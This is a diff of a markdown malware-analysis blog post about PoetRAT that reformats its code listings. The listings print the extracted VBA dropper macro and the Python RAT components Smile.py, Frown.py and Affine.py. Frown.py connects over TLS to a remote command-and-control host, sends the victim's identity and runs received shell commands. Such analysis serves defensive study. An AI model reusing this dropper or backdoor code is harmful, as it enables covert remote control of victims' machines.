@@ -78,90 +78,91 @@ By using **ViperMonkey** I was able to extract the VBA macros
 ![](https://github.com/AbdoD97/abdod97.github.io/blob/master/_posts/PoetRAT/media/image3.png?raw=true)
 
 # Extracted VBA macro
-```VBA
-from vb2py.vbfunctions import \*
-from vb2py.vbdebug import \*
-def document_open():
-    data = String()
-    User = String()
-    bla = String()
-    Coper = Object()
-    ActiveDocument.ActiveWindow.View.ReadingLayout = False
-    ActiveDocument.Unprotect(\'securePass\')
-    show()
-    ActiveDocument.Protect(wdAllowOnlyReading, True, \'securePass\', False, False)
-    User = \'C:\\\\Users\\\\Public\'
-    Docer = ActiveDocument.FullName
-    #Copy
-    Shell(\'cmd /c copy \' + Docer + \' \' + User + \'\\\\docer.doc\', vbHide)
-    deay()(( 4 ))
-    data = bin2var(User + \'\\\\docer.doc\')
-    data = Right(data, 7074638)
-    var2bin(User + \'\\\\smile.zip\', data)
-    bla = VBA.FileSystem.Dir(User + \'\\\\Python37\', vbDirectory)
-    if bla != VBA.Constants.vbNullString:
-        Shell(\'cmd /c rmdir /s /q \' + User + \'\\\\Python37\', vbHide)
-        deay()(( 2 ))
-    #Unzip
-    Unzip(User + \'\\\\smile.zip\', User, \'Python37\')
-    #Clean
-    Kill(User + \'\\\\smile.zip\')
-    Kill(User + \'\\\\docer.doc\')
-    #Run
-    Shell(\'\"\' + User + \'\\\\Python37\\\\python.exe\' + \'\" \"\' + User + \'\\\\Python37\\\\launcher.py\' + \'\"\', vbHide)
+```vbscript
+from vb2py.vbfunctions import *
+from vb2py.vbdebug import *
+def document_open():
+    data = String()
+    User = String()
+    bla = String()
+    Coper = Object()
+    ActiveDocument.ActiveWindow.View.ReadingLayout = False
+    ActiveDocument.Unprotect('securePass')
+    show()
+    ActiveDocument.Protect(wdAllowOnlyReading, True, 'securePass', False, False)
+    User = 'C:\\Users\\Public'
+    Docer = ActiveDocument.FullName
+    #Copy
+    Shell('cmd /c copy ' + Docer + ' ' + User + '\\docer.doc', vbHide)
+    deay()(( 4 ))
+    data = bin2var(User + '\\docer.doc')
+    data = Right(data, 7074638)
+    var2bin(User + '\\smile.zip', data)
+    bla = VBA.FileSystem.Dir(User + '\\Python37', vbDirectory)
+    if bla != VBA.Constants.vbNullString:
+        Shell('cmd /c rmdir /s /q ' + User + '\\Python37', vbHide)
+        deay()(( 2 ))
+    #Unzip
+    Unzip(User + '\\smile.zip', User, 'Python37')
+    #Clean
+    Kill(User + '\\smile.zip')
+    Kill(User + '\\docer.doc')
+    #Run
+    Shell('"' + User + '\\Python37\\python.exe' + '" "' + User + '\\Python37\\launcher.py' + '"', vbHide)
 
-def bin2var(filename):
-    f = **Integer**()
-    #Which alters **when** it alteration finds,
-    #**Or** bends **with** the remover **to** remove.
-    f = FreeFile()
-    VBFiles.openFile(f, filename, \'b\') # VB2PY (UnknownFileMode) \'Access\', \'Read\', \'Lock\', \'Write\'
-    fn_return_value = Space(FileLen(filename))
-    **Get**(f, VBGetMissingArgument(**Get**, 1), bin2var())
-    VBFiles.closeFile(f)
-    #O no! it **is** an ever-fixed mark
-    #That looks **on** tempests **and** **is** never shaken;
-    **return** fn_return_value
+def bin2var(filename):
+    f = Integer()
+    #Which alters when it alteration finds,
+    #Or bends with the remover to remove.
+    f = FreeFile()
+    VBFiles.openFile(f, filename, 'b') # VB2PY (UnknownFileMode) 'Access', 'Read', 'Lock', 'Write'
+    fn_return_value = Space(FileLen(filename))
+    Get(f, VBGetMissingArgument(Get, 1), bin2var())
+    VBFiles.closeFile(f)
+    #O no! it is an ever-fixed mark
+    #That looks on tempests and is never shaken;
+    return fn_return_value
 
-def var2bin(filename, data):
-    f = **Integer**()
-    #**If** this be **error** **and** upon **me** prov\'d,
-    #I never writ, nor no man ever lov\'d.
-    f = FreeFile()
-    VBFiles.openFile(f, filename, \'w\') # VB2PY (UnknownFileMode) \'Access\', \'Write\', \'Lock\', \'Write\'
-    VBFiles.writeText(f, data)
-    VBFiles.closeFile(f)
-def Unzip(Fname, DefPath, TarFold):
-    oApp = Object()
-    FileNameFolder = **Variant**()
-    #Root folder **for** the **new** folder.
-    if Right(DefPath, 1) != \'\\\\\':
-        DefPath = DefPath + \'\\\\\'
-    #Create the folder name
-    strDate = Format(Now, \' dd-mm-yy h-mm-ss\')
-    FileNameFolder = DefPath + TarFold + \'\\\\\'
-    #Make the normal folder **in** DefPath
-    MkDir(FileNameFolder)
-    #Extract the files into the newly created folder
-    oApp = CreateObject(\'Shell.Application\')
-    oApp.**Namespace**(FileNameFolder).CopyHere(oApp.**Namespace**(Fname).items, 4)
-def hide():
-    ActiveDocument.Sections\[1\].Range.Font.Hidden = False
-    **for** Section **in** ActiveDocument.Sections:
-        if Section.Index > 1:
-            Section.Range.Font.Hidden = True
-def show():
-    ActiveDocument.Sections\[1\].Range.Font.Hidden = True
-    **for** Section **in** ActiveDocument.Sections:
-        if Section.Index > 1:
-            Section.Range.Font.Hidden = False
-def deay(min):
-    ptr = **Variant**()
-    ptr = DateAdd(\'s\', min, Time())
-    if ptr > Time():
-        **while** **not** (( Time() > ptr )):
-            pass
-    **return** fn_return_value
+def var2bin(filename, data):
+    f = Integer()
+    #If this be error and upon me prov'd,
+    #I never writ, nor no man ever lov'd.
+    f = FreeFile()
+    VBFiles.openFile(f, filename, 'w') # VB2PY (UnknownFileMode) 'Access', 'Write', 'Lock', 'Write'
+    VBFiles.writeText(f, data)
+    VBFiles.closeFile(f)
+def Unzip(Fname, DefPath, TarFold):
+    oApp = Object()
+    FileNameFolder = Variant()
+    #Root folder for the new folder.
+    if Right(DefPath, 1) != '\\':
+        DefPath = DefPath + '\\'
+    #Create the folder name
+    strDate = Format(Now, ' dd-mm-yy h-mm-ss')
+    FileNameFolder = DefPath + TarFold + '\\'
+    #Make the normal folder in DefPath
+    MkDir(FileNameFolder)
+    #Extract the files into the newly created folder
+    oApp = CreateObject('Shell.Application')
+    oApp.Namespace(FileNameFolder).CopyHere(oApp.Namespace(Fname).items, 4)
+def hide():
+    ActiveDocument.Sections[1].Range.Font.Hidden = False
+    for Section in ActiveDocument.Sections:
+        if Section.Index > 1:
+            Section.Range.Font.Hidden = True
+def show():
+    ActiveDocument.Sections[1].Range.Font.Hidden = True
+    for Section in ActiveDocument.Sections:
+        if Section.Index > 1:
+            Section.Range.Font.Hidden = False
+def deay(min):
+    ptr = Variant()
+    ptr = DateAdd('s', min, Time())
+    if ptr > Time():
+        while not (( Time() > ptr )):
+            pass
+    return fn_return_value
+
 ```
 # VBA Macro Analysis
 
@@ -261,56 +262,55 @@ This function is basically launched under two cases, the first one is
 
 ## **Smile.py** 
 ```python
-import multiprocessing\
-import sys\
-from colorama import init as c_init, Fore, Style\
-from affine import Affine\
-from smile_funs import \*\
-c_init()\
-wanted = True\
-**def** communicate():\
-    resp = \"\"\
-    aff = Affine()\
-    **while** resp != \"exit\":\
-        **try**:\
-            header = f\"\"\"\\n{Fore.RED}{getuser()}\@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}\$ \"\"\"\
-            **try**:\
-                it = **open**(pipe_out, \"wb\")\
-                it.truncate(0)\
-                it.write(aff.encrypt(resp + header))\
-                resp = \"\"\
-                it.close()\
-            **except** Exception as e:\
-                it = **open**(pipe_out, \"w+\")\
-                it.truncate(0)\
-                it.write(aff.encrypt(**str**(e) + header))\
-                it.close()\
-            file_ready()\
-\
-            waiting_file()\
-            cmd = aff.decrypt(**open**(pipe_out, \"rb\").read())\
-            **if** **len**(cmd) > 2 **and** \"\$\$\" == cmd\[0:2\]:\
-                receiver, sender = multiprocessing.Pipe(False)\
-                process = multiprocessing.Process(target=work_on_cmd_process, name=cmd\[2:\], args=(cmd\[2:\], sender),\
-                                                  daemon=True)\
-                processes.append({\"process\": process, \"receiver\": receiver, \"data\": \"\", \"root\": os.getcwd()})\
-                process.start()\
-            **else**:\
-                resp = work_on_cmd(cmd)\
-        **except** Exception as e:\
-            **with** **open**(pipe_out + \"BADD\", \"w+\") as f:\
-                f.write((\"\\n\\nBad Error Happened \" + **str**(e) + \"\\n\\n\\n\\n\" + **str**(resp)))\
-    **global** wanted\
-    **if** resp == \"exit\":\
-        wanted = False
+import multiprocessing
+import sys
+from colorama import init as c_init, Fore, Style
+from affine import Affine
+from smile_funs import *
+c_init()
+wanted = True
+def communicate():
+    resp = ""
+    aff = Affine()
+    while resp != "exit":
+        try:
+            header = f"""\n{Fore.RED}{getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
+            try:
+                it = open(pipe_out, "wb")
+                it.truncate(0)
+                it.write(aff.encrypt(resp + header))
+                resp = ""
+                it.close()
+            except Exception as e:
+                it = open(pipe_out, "w+")
+                it.truncate(0)
+                it.write(aff.encrypt(str(e) + header))
+                it.close()
+            file_ready()
 
-    time.sleep(0.5)\
-**def** main():\
-    **while** wanted:\
-        communicate()\
-    sys.exit(0)\
-**if** \_\_name\_\_ == \"\_\_main\_\_\":\
-    main()
+            waiting_file()
+            cmd = aff.decrypt(open(pipe_out, "rb").read())
+            if len(cmd) > 2 and "$$" == cmd[0:2]:
+                receiver, sender = multiprocessing.Pipe(False)
+                process = multiprocessing.Process(target=work_on_cmd_process, name=cmd[2:], args=(cmd[2:], sender),
+                                                  daemon=True)
+                processes.append({"process": process, "receiver": receiver, "data": "", "root": os.getcwd()})
+                process.start()
+            else:
+                resp = work_on_cmd(cmd)
+        except Exception as e:
+            with open(pipe_out + "BADD", "w+") as f:
+                f.write(("\n\nBad Error Happened " + str(e) + "\n\n\n\n" + str(resp)))
+    global wanted
+    if resp == "exit":
+        wanted = False
+    time.sleep(0.5)
+def main():
+    while wanted:
+        communicate()
+    sys.exit(0)
+if __name__ == "__main__":
+    main()
 ```
 it executes the communication function whilst the victim is still
 **wanted**, this status means that the victim is still a matter of
@@ -336,111 +336,111 @@ interest.
 
 ## **Frown.py**
 ```python
-**def** recv(size, wait=False):\
-    ready = select.select(\[sock\], \[\], \[\], 187)\
-    **if** wait:\
-        **while** **not** ready\[0\]:\
-            **if** **not** is_connected():\
-                **return** False\
-            ready = select.select(\[sock\], \[\], \[\], 187)\
-    **if** ready\[0\]:\
-        d = sock.recv(size)\
-        **if** **not** d:\
-            **raise** ConnectionResetError()\
-        **return** d.decode()\
-    **return** False\
-**def** run_cmd(cmd, wait=True):\
-    **if** **not** wait:\
-        Popen(cmd, shell=True)\
-        **return** \"\"\
-    comm = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE, universal_newlines=True)\
-    stdout, stderr = comm.communicate()\
-    **if** **not** stdout:\
-        **return** **str**(stderr)\
-    **return** **str**(stdout)\
-**def** connect():\
-    **global** sock\
-    **while** True:\
-        **try**:\
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS)\
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\
-            sock = context.wrap_socket(s, server_hostname=host)\
-            sock.connect((host, port))\
-            sock.send(b\"almond\")\
-            res = recv(5, True)\
-            **if** \"who\" **in** res:\
-                sock.send(f\"\"\"{getuser()}\@{node()}-{guid}\"\"\".encode())\
-                res = recv(5, True)\
-            **if** \"ice\" **in** res:\
-                **break**\
-        **except** Exception as e:\
-            sleep(183)\
-\
-**def** is_connected():\
-    **if** **not** online():\
-        **return** False\
-    **try**:\
-        sock.send(b\'\\x00\')\
-        **return** True\
-    **except**:\
-        **return** False\
-**def** online():\
-    **try**:\
-        socket.setdefaulttimeout(260)\
-        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((\"google.com\", 80))\
-        **return** True\
-    **except** Exception as exp:\
-        **return** False\
-**def** file_ready():\
-    **open**(pipe_out + \".ready\", \"w+\").write(\'1\')\
-**def** waiting_file():\
-    count = 1000\
-    **while** **open**(pipe_out + \".ready\", \"r\").read() != \'0\' **and** count > 0:\
-        sleep(0.5)\
-        count -= 1\
-**def** communicate():\
-    **global** wanted\
-    aff = Affine()\
-    **try**:\
-        d = **open**(pipe_out, \"rb\").read()\
-        **if** **len**(d) == 0:\
-            d = \"EMPTY\"\
-        **else**:\
-            d = aff.decrypt(d)\
-        sock.send(d.encode())\
-        res = recv(4028, True)\
-        it = **open**(pipe_out, \"wb\")\
-        **if** res.rstrip() == \"exit\":\
-            wanted = False\
-        **elif** res.rstrip() == \"dis\":\
-            it.close()\
-            sys.exit(0)\
-        **elif** res.rstrip() == \"##\":\
-            **while** res.rstrip() != \"exit\":\
-                res = recv(4028, True)\
-                sock.send(run_cmd(res.rstrip()).encode())\
-            **return**\
-        it.truncate(0)\
-        res = aff.encrypt(res)\
-        it.write(res)\
-        it.close()\
-        file_ready()\
-    **except** ConnectionResetError:\
-        sock.close()\
-    **except** Exception as e:\
-        **if** is_connected():\
-            sock.send(\"An error has occurred: {}\".format(**str**(e)).encode())\
-**def** main():\
-    sleep(83)\
-    **while** wanted:\
-        **try**:\
-            waiting_file()\
-            **if** **not** is_connected():\
-                connect()\
-            communicate()\
-        **except** Exception as a:\
-            **if** is_connected():\
-                sock.send(**str**(a).encode())
+def recv(size, wait=False):
+    ready = select.select([sock], [], [], 187)
+    if wait:
+        while not ready[0]:
+            if not is_connected():
+                return False
+            ready = select.select([sock], [], [], 187)
+    if ready[0]:
+        d = sock.recv(size)
+        if not d:
+            raise ConnectionResetError()
+        return d.decode()
+    return False
+def run_cmd(cmd, wait=True):
+    if not wait:
+        Popen(cmd, shell=True)
+        return ""
+    comm = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE, universal_newlines=True)
+    stdout, stderr = comm.communicate()
+    if not stdout:
+        return str(stderr)
+    return str(stdout)
+def connect():
+    global sock
+    while True:
+        try:
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock = context.wrap_socket(s, server_hostname=host)
+            sock.connect((host, port))
+            sock.send(b"almond")
+            res = recv(5, True)
+            if "who" in res:
+                sock.send(f"""{getuser()}@{node()}-{guid}""".encode())
+                res = recv(5, True)
+            if "ice" in res:
+                break
+        except Exception as e:
+            sleep(183)
+
+def is_connected():
+    if not online():
+        return False
+    try:
+        sock.send(b'\x00')
+        return True
+    except:
+        return False
+def online():
+    try:
+        socket.setdefaulttimeout(260)
+        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("google.com", 80))
+        return True
+    except Exception as exp:
+        return False
+def file_ready():
+    open(pipe_out + ".ready", "w+").write('1')
+def waiting_file():
+    count = 1000
+    while open(pipe_out + ".ready", "r").read() != '0' and count > 0:
+        sleep(0.5)
+        count -= 1
+def communicate():
+    global wanted
+    aff = Affine()
+    try:
+        d = open(pipe_out, "rb").read()
+        if len(d) == 0:
+            d = "EMPTY"
+        else:
+            d = aff.decrypt(d)
+        sock.send(d.encode())
+        res = recv(4028, True)
+        it = open(pipe_out, "wb")
+        if res.rstrip() == "exit":
+            wanted = False
+        elif res.rstrip() == "dis":
+            it.close()
+            sys.exit(0)
+        elif res.rstrip() == "##":
+            while res.rstrip() != "exit":
+                res = recv(4028, True)
+                sock.send(run_cmd(res.rstrip()).encode())
+            return
+        it.truncate(0)
+        res = aff.encrypt(res)
+        it.write(res)
+        it.close()
+        file_ready()
+    except ConnectionResetError:
+        sock.close()
+    except Exception as e:
+        if is_connected():
+            sock.send("An error has occurred: {}".format(str(e)).encode())
+def main():
+    sleep(83)
+    while wanted:
+        try:
+            waiting_file()
+            if not is_connected():
+                connect()
+            communicate()
+        except Exception as a:
+            if is_connected():
+                sock.send(str(a).encode())
 ```
 So basically, how this works?
 
@@ -484,33 +484,34 @@ if malware received:
 
 ## **Affine.py**
 ```python
-import base64\
-**class** Affine(**object**):\
-    DIE = 128\
-    KEY = (7, 3, 55)\
-\
-    **def** \_\_init\_\_(self):\
-        **pass**\
-\
-    **def** encrypt_char(self, char):\
-        K1, K2, kI = self.KEY\
-        **return** **chr**((K1 \* **ord**(**str**(char)) + K2) % self.DIE)\
-\
-    **def** encrypt(self, string):\
-        st = base64.b64encode(string.encode(\"utf-8\")).decode()\
-        **return** \"\".join(**map**(self.encrypt_char, st)).encode()\
-\
-    **def** decrypt_char(self, char):\
-        K1, K2, KI = self.KEY\
-        **return** **chr**(KI \* (**ord**(**str**(char)) - K2) % self.DIE)\
-\
-    **def** decrypt(self, string):\
-        **try**:\
-            string = string.decode()\
-        **except**:\
-            **pass**\
-        st = \"\".join(**map**(self.decrypt_char, string))\
-        **return** base64.b64decode(st.encode()).decode(\"utf-8\")
+import base64
+class Affine(object):
+    DIE = 128
+    KEY = (7, 3, 55)
+
+    def __init__(self):
+        pass
+
+    def encrypt_char(self, char):
+        K1, K2, kI = self.KEY
+        return chr((K1 * ord(str(char)) + K2) % self.DIE)
+
+    def encrypt(self, string):
+        st = base64.b64encode(string.encode("utf-8")).decode()
+        return "".join(map(self.encrypt_char, st)).encode()
+
+    def decrypt_char(self, char):
+        K1, K2, KI = self.KEY
+        return chr(KI * (ord(str(char)) - K2) % self.DIE)
+
+    def decrypt(self, string):
+        try:
+            string = string.decode()
+        except:
+            pass
+        st = "".join(map(self.decrypt_char, string))
+        return base64.b64decode(st.encode()).decode("utf-8")
+
 ```
 Affine script is used as encryption/decryption module it's initialized
 in all scripts communicating through "**Abibliophobia23**" file, noting
